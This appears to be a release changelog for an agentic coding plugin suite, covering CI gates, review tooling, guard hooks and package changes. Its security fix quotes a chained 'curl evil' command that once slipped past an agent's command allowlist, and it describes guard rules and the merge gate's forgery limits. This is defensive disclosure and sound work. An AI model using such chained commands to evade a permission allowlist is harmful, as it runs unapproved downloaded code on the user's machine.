- **Tool abstraction layer, delivered in 11 PRs (#191-#201):** contract and config foundation (#191), adapter manifest, discovery and validation (#192), runner (#193), detection and confirmation (#194), runtime delivery (#195; the toolchain CLI and the adapter skills are vendored into the Pi and Codex outputs), tracker contract and default adapter (#196), work-graph fallback and tracker command refactors (#197), alternative trackers (#198), host and workflow (#199), long-tail categories (#200), and lint, equivalence and documentation (#201). Adapter skills by package: `ensemble-development` (beads tracker and work graph, default test runner, reviewdog lint), `ensemble-git` (GitHub host, git-town and plain-git workflow, plain-git worktree, local CI through `act`), `ensemble-infrastructure` (Jira Cloud and Azure Boards trackers, Azure DevOps host, Docker and kubectl container deploy, Terraform IaC, AWS platform cloud), `ensemble-e2e-testing` (Playwright e2e quality), `ensemble-core` (npm package runner) and `ensemble-quality` (CodeRabbit review).
- **Documentation:** generated per-category contract specs in `docs/toolchain/contracts/` (regenerate with `node scripts/generate-contract-docs.js`, verify with `--check`), the [adapter authoring guide](docs/guides/adapter-authoring.md) and the [toolchain migration guide](docs/guides/toolchain-migration.md), which gives a fix for every lint failure class.
- **Local CI gate (`ensemble-development`, `ensemble-git`; PRD/TRD 2026-4dec59b8; #184, #189, #190):** `npm run ci:local` reproduces CI on a clean clone of the committed HEAD (no `node_modules`, no `dist`): it runs `npm ci --legacy-peer-deps` and then `scripts-tests`, `validate`, `generate-validate`, `generated-drift` and `test` with `CI=true`, prints a result table and exits non-zero on failure; it never touches the working tree. The new `local-ci-gate` skill runs the repository's required checks against a clean clone of the exact PR head on Node 22 and 24, posts an `ensemble/local-ci` commit status with the maintainer's own `gh` login, and `/ensemble:pr-merge` now decides on that gate verdict instead of waiting for hosted CI and bot reviews: bot reviews never block a merge, a human `CHANGES_REQUESTED` review does, and a PR branch that is behind its base is refused, not skipped. **Honest limits:** there is no GitHub App, so the required check is unpinned and any identity with write access can post a status under that name. The gate stops accidents and agents merging unverified work; it does not stop deliberate forgery. Shipping it changes no branch protection: until a repository admin follows the rollout runbook (`packages/development/skills/local-ci-gate/RUNBOOK.md`) and requires `ensemble/local-ci`, GitHub still enforces the hosted checks the branch requires, and `pr-merge` never bypasses a required check.
- **Three new plugins (instruction-content audit, #181 and #182):**
  - `ensemble-telemetry` (`packages/telemetry`): local, opt-in usage telemetry. Off by default (`ENSEMBLE_TELEMETRY=1` or a `.ensemble/telemetry/enabled` file); one `{ts, session_id, kind, name}` line per command, skill or agent use in `.ensemble/telemetry/usage.jsonl`, never prompt text, tool input or output, tokens or paths, and nothing leaves the machine. `ensemble-stats` ranks usage and, with `--inventory`, lists the components that were never used. It replaces the removed `ensemble-metrics`.
  - `ensemble-guards` (`packages/guards`): enforcement hooks for rules that prompts can only request, configured in `.ensemble/guards.json`. `protected-branch` blocks `git commit` and `git push` on main, master and production (also after a `git checkout` or `switch` earlier in the same command) and force pushes to them, and blocks a push whose target it cannot resolve; `bypass-flags` blocks `--no-verify` and `--no-gpg-sign`; `br-close-reason` blocks `br close` without a non-empty `--reason`; `dod` (opt-in) blocks Stop and SubagentStop while your command fails. `ENSEMBLE_GUARDS=0` disables every guard and an internal error fails open. It is a standalone plugin, not bundled into `ensemble-full`. Not implemented: a test-first guard. It had not run in a live session when it was merged.
  - `ensemble-lifecycle` (`packages/lifecycle-claude`): runs the `command.start` and `command.end` hooks from `.ensemble/hooks.yaml` in Claude Code (through `UserPromptSubmit`, `Stop`, `StopFailure` and `SessionEnd`), from a committed bundle of the unchanged agent-core lifecycle code and with the same trust store as Pi (`node <plugin>/bundle/lifecycle.cjs trust`, from a terminal). Shell handlers only; prompt handlers stay Pi-only. `Stop` means the turn ended, not that the command finished, and an interrupt ends the run `cancelled` at the next command or `SessionEnd`. It had not run in a live Claude Code session when it was merged.
- **`/ensemble:onboard`, `/ensemble:retro` and four new skills (#181):** `onboard` (`ensemble-development`) onboards you onto an existing codebase: architecture overview, the exact build, test and lint commands, hotspots and an optional debt backlog. `retro` (`ensemble-development`, with `lib/estimate-actual.js`) is a post-release retrospective: estimate accuracy, PRD success-metric status, incidents and proposed follow-ups. New skills: `threat-model` (adds a `## Threat Model` section to a TRD that touches authentication, PII, payments, file upload, external exposure or a new third-party integration) and `incident-triage` (production incidents and postmortems) in `ensemble-quality`, `safe-migration` (schema, API contract and major-dependency changes) in `ensemble-development`, and `a11y-perf-checks` (accessibility and performance budgets for critical journeys) in `ensemble-e2e-testing`. `pr-review-cycle` gains an optional prose-only security gate (`/security-review`, `gitleaks`, `osv-scanner`) that never changes the CLI status.
- **Beads link back to the PRD and TRD (`ensemble-development`, #187):** every bead `/ensemble:implement-trd-beads` scaffolds (epic, story, implementation or test task, synthesized test) now opens with a `## References` block -- TRD, TRD task, PRD, one `PRD Requirement:` per REQ, PRD acceptance criteria, the verified task for tests and the parent epic -- and carries an `externalRef` passed to `br create --external-ref`. This replaces the old `TRD Reference:` and `PRD Reference:` lines, which existed only on task beads, used raw paths and named only the first REQ. Executors must read those links before any work: the new `trd-cli bead-context --bead <id> [--trd <path>]` re-reads the referenced TRD task and PRD requirements live and returns `ok:false` with `missing[]` (exit 1) when anything cannot be resolved; `beads-build-wave` tracks carry a `context_contract`, and a bead whose read fails is commented `blocked:missing-references`, reopened and not implemented. Legacy open beads are not backfilled.
- **Prompt budget, eval harness and CI checks (#181, #186):** a prompt word-budget lint with a ratchet baseline now runs in `npm run validate`; `evals/` is a headless eval harness (stub-tested only: no real-model baseline has been captured) with `docs/guides/prompt-testing.md`; a validator in `validate` and `generate:validate` flags command step keys that the generators do not render (`RENDERED_STEP_KEYS`). CI gains Dependabot, CodeQL, a gitleaks secret scan (pinned CLI, no organization licence secret), a generated-output drift check and an advisory PR size check (`scripts/pr-size.js` counts hand-written against generated lines, warns over the threshold and always exits 0, so it is never a required check).

### Changed

- **Review speed-up, prose half (`pr-review-cycle`, `pr-review-request`; PR 1 of 2):** the review keeps every guarantee -- base-commit guidance, independent verification, `REVIEW_COMPLETE` computed only by the CLI, reduced reviews reported as reduced, never touching the PR -- and stops spending time where it bought none.
  - **Tier before depth.** A local review recorded no tier, so `depth` fell back to `deep` for every PR whatever it changed. The cycle now runs `tier` over the Step 1b path classification before `depth`, with no classifier (that is a `MODE=gate` step): an ordinary change is Medium and gets **Standard**, a change touching a sensitive or High path is High and stays **Deep**, a tier the CLI cannot read is still Deep, and Low is never reached without a classifier (it is Standard until the Low waiver is in force). No tier is ever typed; the report and the state report carry the tier and depth the review ran at.
  - **The reviewer brief is normative.** Reviewers read the diff and a frozen snapshot; they run no test suite and no mutation experiment, make at most one throwaway snippet, and stop at a tool-call cap with the findings so far and the paths they did not reach (which are reported as not reviewed, never as reviewed). The checks that a finding really holds move to the verifiers: the narrowest test, or one mutation in their own throwaway copy, on the one finding they are asked about.
  - **A verifier that returns nothing no longer stalls the round.** It is recorded in `incompleteVerifiers` on every finding it was assigned and the cycle moves on: no wait, no re-dispatch. Those findings come back `unverified` (as the votes contract already says) and the report says in plain words that the review is partially verified.
  - **Cost gate and parallel PRs (`pr-review-request`).** Before a review starts the router shows each PR's tier, depth, reviewer and verifier counts and a time bound (the cycle's own budget; a ceiling, not a forecast), via the new `PLAN_ONLY` input, and asks when a PR resolves to Deep or more than three PRs are listed. Several PRs are then reviewed together: reviewers and verifiers run at the same time, test runs stay one at a time.
  - **An unchanged head costs nothing to ask about again.** With the new `REUSE_RECORDED` input (set only by the router) the cycle's Step 1a returns the recorded result for the same head and base instead of redoing the review; blocked results and results for another base are reviewed again. Every other caller is unchanged.

- **Review dedupe, reviewer agents and more reviewers on request (`pr-review-cycle`, `pr-review-request`):** the review keeps every guarantee -- nothing dropped before verification, `REVIEW_COMPLETE` computed only by the CLI, reduced reviews reported as reduced, the PR never touched.
  - **`ledger dedupe` merges findings that are very probably one defect.** Independent reviewers rarely cite a defect with the same line range or the same words (`delegation-contract.js:293-302` against `:294-302`), so the verbatim location-and-failure-mode key merged nothing (14 in, 14 out) on two real runs and the orchestrator merged by hand. `dedupeFindings` (the CLI's `ledger dedupe`) now also merges findings from **different reviewers** that cite the same file with overlapping lines, or lines within two of each other, and whose descriptions (failure mode and evidence) are of comparable length and agree once the words most of the round's findings share are discounted; a round of two findings merges nothing. Anything not clearly the same defect stays separate: two defects on one line (a non-ASCII path rejected and a backslash-quote escape, both at `evidence-capture.js:31`) are two findings, one reviewer's own findings are never merged with each other, and a finding with an open thread, an `uncertain` flag, another class, another security relevance or another Pre-existing status is never merged this way. Every original link, the fix id, the most-severe-actionable collapse and "an actionable entry never keeps `deferred`" are unchanged, and an entry merged this way lists its members in the new `mergedFrom`. Checked on the real candidates: PR 205's 14 became 11 (the three pairs merged by hand) and PR 207's 40, from four reviewers, became 29, with every candidate accounted for. `recordRound` is untouched: a repeat across rounds is still the exact path, failure mode and class.
  - **The skill says what kind of agent a reviewer or verifier must be.** In a measured run an agent specialised in code review returned in 25 seconds with one finding and ignored the output schema the brief asked for, where a general agent given the same brief followed it and found more (in about 7 minutes). Reviewers and verifiers must now follow the output contract their brief asks for, be able to read files and run read-only commands, and not impose a findings schema or cap their own depth. With no such agent the runtime's general-purpose one runs, and the report (and `reducedReview` in the state report) says in plain words that the assurance is reduced. It names a requirement, never an agent or a product, so it holds on every runtime.
  - **More reviewers on request (`REVIEWER_COUNT`, opt-in).** Standard and Deep already accept more reviewers than the minimum, so no CLI behaviour or bound changed. `REVIEWER_COUNT` (2 to 4) sets the reviewers Step 1c plans; `depth` grades that plan like any other, so `violations` stays binding (Quick keeps its one reviewer, a policy minimum above the count raises it), the verifier count is unchanged, and anything but an integer from 2 to 4 is refused as `REVIEW_BLOCKED` before any reviewer runs. `pr-review-request` passes nothing by default and passes the count only when the person asked for more reviewers ("review thoroughly", "use more reviewers", a number); that request redoes the review rather than returning a recorded one, and the plan and the cost-gate table show the count.

- **Instruction-content audit (#181):** commands, agents, skills, hooks and tooling were audited against what current models and native Claude Code already do, then trimmed or rewritten: `implement-trd-beads` 15.2k -> about 3.2k words (plus an on-demand `implement-trd-beads-reference` skill), the `git-town` skill 58k -> about 2k words, framework and platform skills reduced to conventions only, `create-trd`, `refine-trd`, `new-feature`, `fix-issue`, `pr-merge`, `code-reviewer`, `deep-debugger` and `tech-lead-orchestrator` trimmed, and `CLAUDE.md` 1.7k -> 177 words (it imports `@AGENTS.md`) and `AGENTS.md` 1.6k -> 726. The rewrites are covered by validation, the test suite and contract tests; **none has been measured against model behavior.**
- **packages/ai, blazor, dotnet, nestjs, phoenix, rails, react (breaking for direct `lib/index.js` consumers):** the framework and platform skills were reduced to conventions only, so their `REFERENCE.md`, `VALIDATION.md` and `README.md` side files and their `templates/` and `examples/` files are gone, and each package's `lib/index.js` now exposes only where the skills are. `ai` exports `{ name, skillsDir, skills, skillPath(name) }` (it exported `name`, `version`, `metadata`, `loadSkill`, `getTemplate`, `getExample` and `detectOpenAI`); `blazor`, `nestjs`, `phoenix`, `rails` and `react` export `{ name, skillsDir, skillPath }` (between them they lose the `skill` or `metadata` object, `loadSkill`, `getTemplate`, `getExample`, the detection helpers `isDotNetAvailable`, `isElixirAvailable`, `isRailsAvailable` and `detectReact`, and, for `nestjs`, `getMetadata`, `getTemplateNames`, `getExampleNames`, `isCompatibleWithAgent` and `getDetectionPatterns`); `dotnet` keeps `plugin` and `loadSkill()` (no argument) and drops `getTemplate` and `getExample`. Nothing in this repository calls the removed functions; external users of the `@sunstone-partners/ensemble-*` npm packages could. All seven are therefore MAJOR bumps: `ensemble-ai`, `ensemble-blazor` and `ensemble-react` 7.0.0, `ensemble-nestjs`, `ensemble-phoenix` and `ensemble-rails` 6.0.0, `ensemble-dotnet` 2.0.0.
- **packages/assessment (#182):** the eight `assess-team-*` skills are merged into one `assess-team-dimension` skill (23 -> 16 skills; see Removed). `commit-volume` and `incidents` are dropped (incidents had no data source) along with the per-developer rankings table; the remaining individual-level output is team-level by default, with a minimum sample and a not-a-performance-rating guard. The letter mapping is defined once, and the diagnostic report states that its xlsx template is a prerequisite that is not shipped. Packaging is unchanged: `ensemble-assessment` stays a separate Pi package and stays bundled in `ensemble-full`. The eight skill names no longer exist, so `ensemble-assessment` is a MAJOR bump (2.0.0).
- **Pi installs carry what a skill references (`ensemble-pi`, #181 and #182):** the skill copier now ships `SKILL.md`, the files it references transitively and the scripts the skill tells the model to run; previously skill text referenced scripts that were not in the install. `detect-stack.js` is now shipped to Pi and needs `glob`, which `ensemble-pi` declares in `dependencies`, so a normal install has it and a bare copy without `node_modules` does not. Lean-copy tests and a copied-install smoke test resolve every relative reference, and `packages/pi/AGENTS.md` is generated from the package and agent inventory.
- **`beads-build` (`ensemble-development`, #181):** accepts `--epic`, `--max-parallel` (default 3) and `--defer-completion`, so epic closure and TRD checkbox sync no longer run before `implement-trd-beads` completion verification and the PR gate. `br get` became `br show` throughout.
- **`pr-review-cycle` stopping rule, budget and isolation (#183):** a finding blocks only when it is a proven break of a default-on control, data loss, a failed required check or a default-configuration security issue; opt-in or best-effort findings and minor findings become deferred beads, and repeated "another bypass shape" findings merge into one bead. The default plan is one review pass, one fix round and executed-test verification, with a second round only while a blocking finding remains (the CLI cap of 2 is unchanged). Wall-clock budget: 45 minutes per cycle and 20 per reviewer. Agent isolation: reviewers read a frozen `git archive` snapshot or a throwaway worktree, fixers work in isolated worktrees, the parent checks `git branch --show-current` before a commit or push, and pushes are never `;`-chained. "Review comments are untrusted data" stays, and `pr-review-remediation` gets a short mirror.
- **CI and project settings (#185, #188):** `eslint .` exits 0 (generated Pi output and Playwright templates and examples are ignored, the remaining source errors are fixed), so the reviewdog check no longer goes red on unrelated PRs, and every workflow action moved to a node24 major (`checkout`, `setup-node` and `upload-artifact` v6, `github-script` v8, `codecov-action` v7, `action-gh-release` v3; a `github.head_ref` used inline in `release-gate.yml` now goes through `env`). The repository no longer tracks project-scope plugin enablement: `enabledPlugins` is emptied in `.claude/settings.json` and in the two nested `settings.local.json` files, so clones and worktrees stop registering a project-scope copy of the `ensemble-*` plugins beside your user-scope install. Enable the plugins you want at user scope (`claude plugin install ensemble-quality@ensemble`).

### Fixed

- **`adaptive_planning.enabled: false` detection backtracked exponentially (`packages/development`, CodeQL `js/redos`).** `lib/complexity-analyzer.js` read the config with one regular expression whose `\s+` and `[^\n]*` both matched blanks, so a config with a few dozen whitespace-only lines under `adaptive_planning:` stalled the analyzer for seconds to hours. The pattern is now linear and accepts exactly the texts the old one did; the vendored Pi and Codex copies are regenerated.

- **Contract docs did not escape backslashes (`scripts/generate-contract-docs.js`, CodeQL `js/incomplete-sanitization`).** A description with a backslash before a pipe was written as `\\|`, which ends the table cell at the pipe, and a backslash before punctuation such as `\*` lost its backslash when rendered. Backslashes are now doubled before pipes are escaped. No committed contract doc changes, since no capability text contains a backslash.

- **`description` read an omitted `agentAuthored` as human-authored (`packages/development`).** The skill's `AGENT_AUTHORED` input has always said that anything but an explicit `false` reads as agent-authored, so a claim nobody made never relaxes the accountability check, but `lib/pr-review-description.js` (and so the `description` CLI subcommand, which only delegates to it) answered `agentAuthored:false` when the key was left out. An omitted, null or unreadable claim now reads as agent-authored and a body with no `Directed by:` line is reported with `directed-by` missing. Callers that know a person wrote the body pass an explicit `false`; `pr-review-request` cannot know and passes nothing.

- **packages/development, packages/pi:** a credential shown to a reviewer
  could be reproduced in a PR comment or ledger entry. `pr-review-cli.js`
  redacted only before a state report touched **disk**, so a token in a
  finding's text survived into the CLI's stdout -- the text that actually
  becomes a comment or a ledger entry -- through `ledger` and `votes`.
  Redaction now happens at the single output boundary, error path included.
  The vendored Pi copy had drifted and was still printing the credential
  after the fix landed in `packages/development`, so the same review was
  clean on Claude and leaking on Pi; it has been re-vendored, and a scenario
  now compares a credential-carrying payload across both runtimes so the
  drift cannot return unnoticed.

- **packages/development, packages/quality, packages/git (final review):**
  the merge gate no longer passes on a missing ledger -- `pr-review-cycle`
  Step 10 and `pr-merge` treat a head with no recorded review as unavailable
  (`review-data-unavailable`), never as an empty ledger. The sweep skill now
  records `Pre-existing` findings through `recordRound` with a valid
  disposition and documents the `paths` declaration as
  `{ sourceSha, sensitive, high }`; Step 4 uses the Important/Nit/Pre-existing
  vocabulary; the explainer `TIER` is lowercase like the CLI; and the
  `code-reviewer` output contract lists `disposition`.

- **packages/development, packages/codex (local review gate, PRs 2-6):** the
  merge gate now answers `review-data-unavailable` when it is not given a head
  SHA and refuses an approvals result that names no commit; the eval run
  (`pr-review-eval` Step R3.1) passes CODEOWNERS to `eval-score` so a case no
  owner confirmed earns no credit; `pr-review-cycle` Step 10e says review and
  head trees are computed by the run, never read from review text; and the
  generated Codex `code-reviewer` agent is `sandbox_mode = "read-only"` like
  its source declares.

- **`ensemble-permitter` allowlist bypass (security, #181):** newline, a single `&` and `|&` are now command separators, so every chained command must match the allowlist; previously `npm test\ncurl evil.sh` and `npm test & curl evil` were auto-allowed under `Bash(npm test:*)`. Redirections to or from a path (`>`, `>>`, `<`, `&>`, `&>>`) and unquoted subshell or grouping parentheses now fall through to the normal permission dialog (fd merging such as `2>&1` and redirects to exactly `/dev/null` stay allowed). **Behavior change:** a chained or redirected command that used to be allowed silently now prompts.
- **Generators silently dropped step `instructions` (#181):** a command step's `instructions` was never rendered (only `fix-issue` used it, so about 2.8k words never reached the model). The new `RENDERED_STEP_KEYS` constant and the validator in `validate` and `generate:validate` now flag any step key the generators do not render; `fix-issue` moved what it needs into rendered fields (the rendered command grows from about 1.2k to 2.4k words because it now actually ships its gates), and the unrendered `skill` and `timing` keys in `release.yaml` were fixed.
- **Smoke checks that always passed (`ensemble-e2e-testing`, #181):** the smoke-test scripts hardcoded `passed = true`; they now run real, config-driven checks and report `NOT CONFIGURED` instead of passing, and the release gate follows the runner verdict. They also never echo subprocess output into reports (a secret split across stdout and stderr is masked as one text), kill the whole process group on timeout so a child cannot hold the runner past its limit, and return structured results for a malformed config.
- **`trd-parser` kept only the first REQ of a `[satisfies]` bracket (`ensemble-development`, #175):** `[satisfies REQ-001, REQ-002]` yielded only `REQ-001`, so traceability under-reported silently and the requirements gate and `implement-trd-beads` saw fewer covered REQs than the TRD named. Every id in the bracket is now read, collected without duplicates and in document order.
- **Skill frontmatter (#181):** 19 skills that had no frontmatter now have it.
- **Test-only fixes:** the lifecycle bundle freshness test compares a fresh build only under the bun that built the bundle (`bundle/BUN_VERSION`) and skips otherwise, because bun's output differs between versions (#209); the `pr-review-metrics` baseline-reproduction test is bounded to the baseline's cohort cutoff, so it no longer fails as merged PRs accumulate (#212).

### Documentation

- **User guide section 11, "Code review process":** the whole process in one
  chapter -- `REVIEW.md` and the `ensemble-review-policy` block, depth and
  verification thresholds, risk tiers, commit-bound approvals and the merge
  gate, metrics and the reviewer eval set, sweeps and explainers, and which
  runtimes the capability is reduced on. Each stated gate was checked against
  the shipped modules by running them, not against the changelog.
- **Wiki:** a `Code-Review-Process` page is staged at
  `.wiki-staging/Code-Review-Process.md` per AGENTS.md (local-only, excluded
  from git) and is published with `scripts/wiki-publish.sh --yes`. It is
  generated from user guide section 11, which stays the source of truth.
- **Contributing and PR flow (#186):** `CONTRIBUTING.md` documents the PR flow -- about 400 hand-written lines per PR, new components in their own PR, small stacked PRs merged as they land, a same-day rebase when the base moves, a definition of done (required checks plus the review stopping rule), `npm run ci:local` before pushing, and a consumer check (sibling repositories such as Foreman, and the Pi, Codex and OpenCode outputs) before removing or renaming anything -- plus `docs/guides/stacked-prs.md` and a PR template checklist.
- **PRDs and TRDs:** `PRD-2026-bd69b524` (delivery-flow improvements, Draft v1.0.0, #203) and PRD/TRD 2026-4dec59b8 (local CI PR approval) with the gate's `RUNBOOK.md`, `PROOF.md`, `MEASUREMENT.md` and `BASELINE.md` under `packages/development/skills/local-ci-gate/`.
- **`AGENTS.md`:** a standing rule never to create worktrees, clones or scratch files under `/tmp`; use siblings of the main checkout and `~/.omp/<task-dir>/` instead (#216).

### Removed

- **packages/router, packages/metrics:** the `ensemble-router` and `ensemble-metrics` packages (routing hook; dashboard hooks and `/ensemble:manager-dashboard` with `manager-dashboard-agent`). The router hook registration is dropped from `packages/full/hooks/hooks.json`; `ensemble-permitter` stays. Telemetry lives in `packages/telemetry`.
- **Commands:** `/ensemble:generate-api-docs` and `/ensemble:analyze-product` (removing `analyze-product` makes `ensemble-product` a MAJOR bump, 7.0.0). (`claude-changelog` and `create-trd-foreman` were already removed in 7.0.0.)
- **Agents:** `general-purpose`, `file-creator`, `context-fetcher`, `agent-meta-engineer`, `directory-monitor`, `pm`, `api-documentation-specialist`, `mobile-developer`, `qa-orchestrator` (use `test-runner`) and `github-specialist` (merged into `git-workflow`). (`test-reader-agent` was already removed in 7.0.0.)
- **Skills:** the generic tutorial skills `typescript`, `python`, `php`, `laravel`, `flutter`, `tailwind`, `prisma` and `celery` (formerly `developing-with-*`, `styling-with-tailwind`, `using-prisma`, `using-celery`) from `ensemble-development`.
- **Command and skill with no callers (`ensemble-development`):** `/ensemble:beads-plan` and the `complete-beads` skill.
- **Assessment skills (`ensemble-assessment`):** `assess-team-ai-adoption`, `assess-team-code-quality`, `assess-team-code-review`, `assess-team-commit-messages`, `assess-team-commit-volume`, `assess-team-documentation`, `assess-team-incidents` and `assess-team-test-coverage`, replaced by `assess-team-dimension` (`commit-volume` and `incidents` have no replacement).
- **Dead code:** `packages/multiplexer-adapters`, `tools/version-manager` and a dangling `packages/full` symlink.

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 7.0.0 → 8.0.0 (dev carried an interim
  7.0.1). This is a MAJOR release because packages, commands, agents and
  skills are removed (see Removed), `/ensemble:pr-merge` now decides on the
  local CI gate verdict, and `ensemble-permitter` stops auto-allowing chained
  and redirected commands (see Added and Fixed). Content-change bumps follow
  semver per package. No commit carries a breaking-change marker, so MAJOR is
  judged from the diff, as in 7.0.0 (a public export, skill or command was
  removed); otherwise `feat` → MINOR and everything else PATCH:
  - MAJOR: `ensemble-ai` 6.0.0 → 7.0.0, `ensemble-blazor` 6.0.0 → 7.0.0,
    `ensemble-react` 6.0.0 → 7.0.0, `ensemble-nestjs` 5.1.1 → 6.0.0,
    `ensemble-phoenix` 5.1.1 → 6.0.0, `ensemble-rails` 5.1.1 → 6.0.0 and
    `ensemble-dotnet` 1.1.0 → 2.0.0 (public `lib/index.js` exports removed;
    see Changed), `ensemble-assessment` 1.1.0 → 2.0.0 (eight skills removed)
    and `ensemble-product` 6.0.0 → 7.0.0 (`/ensemble:analyze-product`
    removed).
  - MINOR (`feat` commits): `ensemble-e2e-testing` 6.0.0 → 6.1.0,
    `ensemble-infrastructure` 6.0.0 → 6.1.0, `ensemble-opencode` 5.3.1 → 5.4.0
    and `ensemble-pytest` 5.1.1 → 5.2.0.
  - PATCH: `ensemble-jest` 5.1.1 → 5.1.2 and `ensemble-permitter` 5.2.1 →
    5.2.2.
  - Already bumped on dev and kept: `ensemble-core` 6.0.0 → 6.1.0,
    `ensemble-git` 6.0.0 → 6.1.0, `ensemble-development` 7.0.0 → 7.0.1,
    `ensemble-quality` 6.0.0 → 6.0.1, `ensemble-codex` 6.0.0 → 6.0.1
    (regenerated) and `ensemble-pi` 1.6.16 → 1.6.18 (owned by
    `scripts/bump-pi-version-if-changed.js`, not edited by hand here).
  - New marketplace entries: `ensemble-telemetry` 5.2.1, `ensemble-guards`
    5.2.1 and `ensemble-lifecycle` 7.0.0. Retired: `ensemble-metrics` (was
    6.0.0) and `ensemble-router` (was 5.2.3).
  - Unchanged: `ensemble-exunit`, `ensemble-reqnroll`, `ensemble-rspec` and
    `ensemble-xunit`. `ensemble-agent-core` and `ensemble-pi-extension` stay
    at 0.1.2: they have no marketplace entry and are installed from a
    checkout.
- `@sunstone-partners/ensemble-*` dependency ranges that the new majors no
  longer satisfy were moved in `ensemble-full`'s peerDependencies
  (`ensemble-ai`, `ensemble-blazor`, `ensemble-react` and `ensemble-product`
  to `^7.0.0`; `ensemble-nestjs`, `ensemble-phoenix` and `ensemble-rails` to
  `^6.0.0`; `ensemble-dotnet` to `^2.0.0`), so a plain `npm install` still
  resolves against the workspace; no other range moved. `package-lock.json`
  was brought back in line with the manifests (it had drifted for
  `ensemble-core`, `ensemble-git`, `ensemble-development`, `ensemble-quality`,
  `ensemble-codex` and `ensemble-pi`).

## [7.0.0] - 2026-10-18

### Changed

- **Hidden commands (new `metadata.visibility: hidden`):** a command YAML can now be hidden so it is not typable but stays readable by its dispatcher. Claude Code: generated frontmatter `user-invocable: false` (hidden from the slash menu; the model can still invoke it). Pi: written to `packages/pi/prompts/_hidden/` with no command-wrapper skill, and `packages/pi/package.json` `pi.prompts` changes from `./prompts` to `./prompts/*.md` because `pi install` registers subdirectories of a listed directory. Codex: wrapper skill gets `user-invocable: false`. The Pi generator now removes the old visible prompt and wrapper skill when a command becomes hidden.
- **New dispatchers:** `/ensemble:reqnroll` (`features|feature-drift|bindings|binding-drift|tdd`) and `/ensemble:standards` (`discover|inject|fold`). `generate-feature-tests`, `check-feature-drift`, `generate-reqnroll-bindings`, `check-binding-drift`, `reqnroll-tdd`, `discover-standards` and `inject-standards` are now hidden behind them (**not typable by their old names**); `fold-prompt` stays typable because `directory-monitor` invokes it by name. `beads-build-wave` is hidden too; its agent now also looks for the Pi hidden prompt path. Typable commands: 44 -> 38 (46 generated; 8 hidden).
- **packages/assessment:** new `/ensemble:assess` command: `repo`, `team`, `config`, `report`, and `repo --only <dimension>`, each loading the matching assessment skill by name (leaf skills stay invokable). `ensemble-assessment` is self-contained on Pi: the Pi generator now writes its prompt and command-wrapper skill into `packages/assessment/` (new `SELF_CONTAINED_PI_PACKAGES` in `packages/pi/src/self-contained-packages.ts`, which also drives the `ensemble-pi` exclusion), `packages/assessment/package.json` `pi.prompts` is `./prompts/*.md`, and `ensemble-pi` ships no assess prompt. `ensemble-full` carries the command via `commands/assessment`. Installing `ensemble-assessment` into Pi registers `ensemble-assess` plus the 22 assessment skills (checked with `pi install` and RPC `get_commands`); on OMP it is reachable through the `ensemble-assess` wrapper skill. Typable commands: 38 -> 39.
- **Variant commands folded into flags (breaking: the old command names no longer exist):**
  - `create-prd-meeting` -> `/ensemble:create-prd --from-meeting`; `refine-prd-meeting` -> `/ensemble:refine-prd --from-meeting`. The meeting-specific phases (summary intake, inferred scale, no-invention / `[NEEDS CLARIFICATION]` discipline, non-interactive critique, resolvable-vs-still-open classification) are preserved as flag-gated sections. **Behavior changes:** `--from-meeting` now runs the Constitution Gate like every other `create-prd` run, so a repo with no constitution file halts with `CONSTITUTION_CONFIG_ERROR` where the old variant did not; it is mutually exclusive with `--foreman` (and `--collab`/`--long-lived` on refine); meeting-sourced drafts now carry the standard frontmatter label; lifecycle hooks keyed on `ensemble:create-prd-meeting` / `ensemble:refine-prd-meeting` must key on `ensemble:create-prd` / `ensemble:refine-prd`.
  - `create-trd-foreman` -> `/ensemble:create-trd --parser-tables` (sprint/story tables, no adversarial review, `foreman sling prd` next step). The flag is not `--foreman` because `create-trd --foreman` already means "standard TRD with Foreman artifact contracts" and Foreman's own default workflow runs it; the two combine. The variant's "skip to Output Management" after the MCP step now routes through the Constitution Gate instead of bypassing it.
  - `create-workstream-trd` -> `/ensemble:implement-trd-beads <trd> <trd> --workstream --generate-only` (the generator step already lived there). The `trd` dispatcher drops the `foreman` and `workstream` keywords and the `prd` dispatcher drops `create-meeting` / `refine-meeting`; the flags go on `create`, `refine` and `implement`.
  - Typable commands: 39 -> 35.
- **Skill renames (breaking for anything that loads these by name):** skill directory names now equal their technology name. `developing-with-typescript|python|php|laravel|flutter` -> `typescript|python|php|laravel|flutter`; `styling-with-tailwind` -> `tailwind`; `managing-jira-issues` -> `jira`; `managing-linear-issues` -> `linear`; `managing-railway` -> `railway`; `managing-vercel` -> `vercel`; `managing-supabase` -> `supabase`; `aws-cloud` -> `aws`; `using-prisma` -> `prisma`; `using-celery` -> `celery`; `using-weaviate` -> `weaviate`; `using-anthropic-platform` -> `anthropic`; `using-openai-platform` -> `openai`; `using-perplexity-platform` -> `perplexity`; `building-langgraph-agents` -> `langgraph`.
- **packages/react, packages/dotnet:** `developing-with-react` is folded into the `react` skill (the `react` skill is now also in `ensemble-full`); the `dotnet-framework` skill moves from `ensemble-blazor` to `ensemble-dotnet` as `dotnet`.
- **packages/e2e-testing:** the five `smoke-test-*` leaf skills are merged into `smoke-test-runner` (`smoke-test-api|auth|critical-paths|database|external-services` no longer exist as separate skills).
- **packages/infrastructure, packages/quality, schemas:** both plugin manifests now declare `"dependencies": ["ensemble-core"]` (they call `detect-stack`); `schemas/plugin-schema.json` accepts a bare plugin name, `name@marketplace` or `name@x.y.z` in `dependencies`. Verified on Claude Code 2.1.292 with an isolated config: installing `ensemble-infrastructure` from the `ensemble` marketplace pulls in `ensemble-core` automatically; a bare name resolves against the dependent plugin's own marketplace, and a dependency missing from the marketplace installs with a warning rather than an error. Pi/OMP and Codex have no dependency mechanism, so install `ensemble-core` alongside those packages yourself.
- **packages/blazor (breaking for direct `lib/index.js` consumers):** `loadSkill`, `getTemplate` and `getExample` no longer take a `skillName` argument and `skill.skills` is now `['blazor']`, because `dotnet-framework` moved to `ensemble-dotnet`. Nothing in this repo calls these, but external users of `@sunstone-partners/ensemble-blazor` could.
- **packages/react:** `lib/index.js` had a syntax error (`dependencies?['react-dom']`, now `?.`) and failed `node --check`; fixed while renaming its metadata.
